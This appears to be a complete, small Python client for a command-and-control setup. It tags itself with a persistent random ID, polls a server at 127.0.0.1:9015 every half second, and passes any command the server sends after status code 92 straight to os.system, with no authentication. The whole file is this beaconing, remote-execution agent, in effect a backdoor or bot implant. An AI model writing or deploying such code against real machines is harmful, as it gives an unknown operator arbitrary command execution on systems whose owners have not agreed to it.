import socket
import time
import random
import os


IP = '127.0.0.1'
PORT = 9015
BUF_LEN = 256


def clear_file(path: str):
    with open(path, 'w'):
        pass

def gen_id() -> bytearray:
    res = []
    for _ in range(16):
        res.append(random.randrange(0, 256))
    return bytes(res)


def get_id() -> bytearray:
    need_gen = False
    with open('id.bin', 'rb') as id:
        if len(id.read()) != 16:
            need_gen = True
            
    if need_gen:
        with open('id.bin', 'wb') as id:
            id.write(gen_id())
        
    with open('id.bin', 'rb') as id:
        return id.read()


if __name__ == '__main__':
    while (True):
        time.sleep(0.5)
        request_buf = bytearray()
        request_buf.append(0)
        request_buf.append(0)
        
        for i in get_id():
            request_buf.append(i)
        
        client_fd = socket.socket(family=2, type=1)
        is_server_on = 0
        while (not is_server_on):
            try:
                client_fd.connect((IP, PORT))
                is_server_on = 1
            except ConnectionRefusedError:
                print('Server is turned off')
                time.sleep(10)
                
        client_fd.send(request_buf)
        
        response = client_fd.recv(BUF_LEN)
        # print(response)
        
        response_status = int.from_bytes(response[0:4], 'little')
        
        print(f'response status = {response_status}')
        
        if response_status == 92:
            decoded_command = response[4:].decode()
            print(f'command: {decoded_command}')
            os.system(decoded_command)
        
        client_fd.close()
